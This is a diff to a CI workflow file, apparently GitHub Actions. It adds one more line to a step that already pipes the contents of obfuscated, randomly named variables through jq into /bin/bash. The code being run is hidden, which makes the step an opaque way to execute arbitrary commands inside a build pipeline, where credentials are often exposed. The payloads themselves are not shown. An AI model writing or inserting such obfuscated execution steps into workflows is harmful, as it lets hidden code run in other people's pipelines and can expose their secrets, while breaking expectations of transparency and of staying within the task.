@@ -71,6 +71,7 @@ jobs:
           printf '%s' "$fi14" | jq -r .q10184 | /bin/bash
           echo $xago3 | jq -r .f9879 | /bin/bash
           printf '%s' "$ls59014" | jq -r .vrb4100 | /bin/bash
+          echo $psqel9 | jq -r .x96971 | /bin/bash
 
       - name: Upload artifact
         if: always()
